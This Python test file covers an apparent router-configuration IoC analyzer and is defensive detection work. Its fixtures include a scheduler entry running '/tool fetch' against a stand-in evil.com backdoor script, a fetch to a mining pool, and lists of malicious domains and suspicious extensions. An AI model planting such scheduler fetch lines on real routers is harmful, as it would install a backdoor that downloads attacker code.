"""Tests for ioc_analyzer module."""

from src.config import CommandResult
from src.ioc_analyzer import (
    IoCAnalyzer,
    IoCType,
    IoCResult,
    analyze_ioc,
    KNOWN_MALICIOUS_DOMAINS,
    SUSPICIOUS_EXTENSIONS,
    CRYPTOMINER_POOLS
)


class TestIoCAnalyzer:
    """Tests for IoCAnalyzer."""

    def test_empty_config_returns_no_iocs(self):
        """Test that empty config returns no IoCs."""
        analyzer = IoCAnalyzer()
        iocs = analyzer.analyze()
        assert len(iocs) == 0

    def test_scheduler_fetch_backdoor_detection(self):
        """Test detection of scheduler fetch backdoor."""
        analyzer = IoCAnalyzer()
        analyzer.scheduler_rules = [
            {
                'name': 'update_check',
                'on_event': '/tool fetch http://evil.com/backdoor.sh'
            }
        ]

        iocs = analyzer._check_scheduler_backdoor()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.SCHEDULER_FETCH_BACKDOOR
        assert iocs[0].severity == "Critical"

    def test_scheduler_script_run_detection(self):
        """Test detection of scheduler script run."""
        analyzer = IoCAnalyzer()
        analyzer.scheduler_rules = [
            {
                'name': 'backup',
                'on_event': '/system script run backup_script'
            }
        ]

        iocs = analyzer._check_scheduler_backdoor()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.SCHEDULER_SCRIPT_RUN
        assert iocs[0].severity == "High"

    def test_socks_proxy_detection(self):
        """Test detection of enabled SOCKS proxy."""
        analyzer = IoCAnalyzer()
        analyzer.socks_config = {'enabled': 'yes'}

        iocs = analyzer._check_socks_proxy()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.SOCKS_PROXY_ENABLED
        assert iocs[0].severity == "Critical"

    def test_socks_proxy_disabled_no_ioc(self):
        """Test that disabled SOCKS proxy doesn't trigger IoC."""
        analyzer = IoCAnalyzer()
        analyzer.socks_config = {'enabled': 'no'}

        iocs = analyzer._check_socks_proxy()

        assert len(iocs) == 0

    def test_http_proxy_detection(self):
        """Test detection of enabled HTTP proxy."""
        analyzer = IoCAnalyzer()
        analyzer.proxy_config = {'enabled': 'yes'}

        iocs = analyzer._check_http_proxy()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.HTTP_PROXY_ENABLED
        assert iocs[0].severity == "High"

    def test_suspicious_files_detection(self):
        """Test detection of suspicious files."""
        analyzer = IoCAnalyzer()
        analyzer.files = [
            {'name': 'backdoor.php'},
            {'name': 'miner.exe'},
            {'name': 'script.sh'},
            {'name': 'legit.txt'}  # Should not trigger
        ]

        iocs = analyzer._check_suspicious_files()

        assert len(iocs) == 3  # .php, .exe, .sh
        assert iocs[0].ioc_type == IoCType.SUSPICIOUS_FILES

    def test_unknown_user_full_access_detection(self):
        """Test detection of unknown user with full access."""
        analyzer = IoCAnalyzer()
        analyzer.users = [
            {'name': 'admin', 'group': 'full', 'disabled': 'no'},  # Known user
            {'name': 'hacker', 'group': 'full', 'disabled': 'no'},  # Unknown!
            {'name': 'guest', 'group': 'read', 'disabled': 'no'},  # Not full access
            {'name': 'backdoor', 'group': 'full', 'disabled': 'yes'}  # Disabled
        ]

        iocs = analyzer._check_unknown_users()

        assert len(iocs) == 1
        assert iocs[0].ioc_type == IoCType.UNKNOWN_FULL_ACCESS_USER
        assert 'hacker' in iocs[0].title

    def test_dns_hijacking_detection(self):
        """Test detection of DNS hijacking."""
        analyzer = IoCAnalyzer()
        analyzer.dns_static = [
            {'name': 'check-host.net', 'address': '1.2.3.4'},
            {'name': 'legit.com', 'address': '5.6.7.8'}  # Not malicious
        ]

        iocs = analyzer._check_dns_hijacking()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.DNS_HIJACKING

    def test_mangle_sniff_detection(self):
        """Test detection of mangle sniff rules."""
        analyzer = IoCAnalyzer()
        analyzer.mangle_rules = [
            {'action': 'sniff', 'chain': 'forward'},
            {'action': 'accept', 'chain': 'forward'}  # Normal rule
        ]

        iocs = analyzer._check_mangle_sniff()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.MANGLE_SNIFF_RULE

    def test_arp_spoofing_detection(self):
        """Test detection of ARP spoofing."""
        analyzer = IoCAnalyzer()
        analyzer.arp_table = [
            {'mac_address': 'AA:BB:CC:DD:EE:FF', 'address': '192.168.1.1'},
            {'mac_address': 'AA:BB:CC:DD:EE:FF', 'address': '192.168.1.100'},  # Same MAC!
            {'mac_address': '11:22:33:44:55:66', 'address': '192.168.1.2'}  # Different MAC
        ]
        
        iocs = analyzer._check_arp_spoofing()
        
        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.ARP_SPOOFING

    def test_cryptominer_dns_detection(self):
        """Test detection of cryptominer DNS entries."""
        analyzer = IoCAnalyzer()
        analyzer.dns_static = [
            {'name': 'pool.minexmr.com', 'address': '1.2.3.4'},
            {'name': 'legit.com', 'address': '5.6.7.8'}
        ]

        iocs = analyzer._check_cryptominer_indicators()

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.CRYPTOMINER_INDICATORS

    def test_cryptominer_scheduler_detection(self):
        """Test detection of cryptominer scheduler tasks."""
        analyzer = IoCAnalyzer()
        analyzer.scheduler_rules = [
            {
                'name': 'miner',
                'on_event': '/tool fetch url=\"pool.minexmr.com:3333\"'
            }
        ]

        iocs = analyzer._check_cryptominer_indicators()

        assert len(iocs) > 0
        assert iocs[0].severity == "Critical"

    def test_load_data_from_results(self):
        """Test loading data from command results."""
        analyzer = IoCAnalyzer()

        results = [
            CommandResult(
                index=1,
                command="/system scheduler print detail",
                stdout="0 name=test on-event=\"fetch http://evil.com\"",
                has_error=False
            ),
            CommandResult(
                index=2,
                command="/ip socks print",
                stdout="enabled: yes",
                has_error=False
            )
        ]

        analyzer.load_data(results)

        assert len(analyzer.scheduler_rules) > 0
        assert analyzer.socks_config.get('enabled') == 'yes'

    def test_analyze_ioc_convenience_function(self):
        """Test analyze_ioc convenience function."""
        results = [
            CommandResult(
                index=1,
                command="/ip socks print",
                stdout="enabled: yes",
                has_error=False
            )
        ]

        iocs = analyze_ioc(results)

        assert len(iocs) > 0
        assert iocs[0].ioc_type == IoCType.SOCKS_PROXY_ENABLED


class TestIoCResult:
    """Tests for IoCResult dataclass."""

    def test_ioc_result_creation(self):
        """Test creating IoCResult."""
        result = IoCResult(
            ioc_type=IoCType.SOCKS_PROXY_ENABLED,
            severity="Critical",
            title="SOCKS proxy enabled",
            description="Description",
            evidence="Evidence",
            recommendation="Disable it"
        )

        assert result.ioc_type == IoCType.SOCKS_PROXY_ENABLED
        assert result.severity == "Critical"
        assert result.remediation_commands == []
        assert result.references == []

    def test_ioc_result_with_remediation(self):
        """Test IoCResult with remediation commands."""
        result = IoCResult(
            ioc_type=IoCType.SCHEDULER_FETCH_BACKDOOR,
            severity="Critical",
            title="Backdoor",
            description="Desc",
            evidence="Ev",
            recommendation="Remove it",
            remediation_commands=["/remove command"],
            references=["https://example.com"]
        )

        assert len(result.remediation_commands) == 1
        assert len(result.references) == 1


class TestIoCType:
    """Tests for IoCType enum."""

    def test_all_ioc_types_exist(self):
        """Test that all expected IoC types exist."""
        expected_types = [
            'SCHEDULER_FETCH_BACKDOOR',
            'SCHEDULER_SCRIPT_RUN',
            'SOCKS_PROXY_ENABLED',
            'HTTP_PROXY_ENABLED',
            'SUSPICIOUS_FILES',
            'UNKNOWN_FULL_ACCESS_USER',
            'DNS_HIJACKING',
            'MANGLE_SNIFF_RULE',
            'ARP_SPOOFING',
            'UNUSUAL_STARTUP_SCRIPT',
            'CRYPTOMINER_INDICATORS'
        ]

        for type_name in expected_types:
            assert hasattr(IoCType, type_name), f"Missing IoCType: {type_name}"


class TestIoCConstants:
    """Tests for IoC constants."""

    def test_known_malicious_domains_not_empty(self):
        """Test that known malicious domains list is populated."""
        assert len(KNOWN_MALICIOUS_DOMAINS) > 0
        assert 'pastebin.com' in KNOWN_MALICIOUS_DOMAINS

    def test_suspicious_extensions_not_empty(self):
        """Test that suspicious extensions list is populated."""
        assert len(SUSPICIOUS_EXTENSIONS) > 0
        assert '.php' in SUSPICIOUS_EXTENSIONS
        assert '.exe' in SUSPICIOUS_EXTENSIONS

    def test_cryptominer_pools_not_empty(self):
        """Test that cryptominer pools list is populated."""
        assert len(CRYPTOMINER_POOLS) > 0
        assert 'pool.minexmr.com' in CRYPTOMINER_POOLS
